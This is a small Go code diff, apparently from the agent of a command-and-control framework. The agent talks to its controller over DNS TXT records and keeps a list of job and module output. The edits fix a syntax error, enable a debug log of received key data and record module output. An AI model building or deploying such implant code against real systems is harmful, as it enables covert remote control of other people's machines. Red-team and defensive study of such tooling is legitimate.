@@ -96,7 +96,7 @@ func main() {
 	aesKey, _ = base64.StdEncoding.DecodeString(stringPubKey)
 
 	for {
-		agentfunctions.CheckTime(liveHours))
+		agentfunctions.CheckTime(liveHours)
 		if key == "" {
 			connect("getKey", "")
 			go connect("init", "")
@@ -223,7 +223,7 @@ func getKey() {
 		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
 		agentfunctions.AllOutput.Mutex.Unlock()
 	} else {
-		//logging.Logger.Println("T is:", string(t))
+		logging.Logger.Println("T is:", string(t))
 	}
 	response := sendMsg(msg, dns.TypeTXT)
 	encodedString := strings.ReplaceAll(response.Data, "\"", "")
@@ -455,6 +455,12 @@ func (t *ModData) SendData(data *modulescommon.ModuleCom, reply *int) error {
 		agentfunctions.AllOutput.Mutex.Lock()
 		agentfunctions.JobCount++
 		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
+		agentfunctions.AllOutput.Mutex.Unlock()
+	}
+	if msg != nil {
+		agentfunctions.AllOutput.Mutex.Lock()
+		agentfunctions.JobCount++
+		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"module", string(msg)}
 		agentfunctions.AllOutput.Mutex.Unlock()
 	}
 	return nil
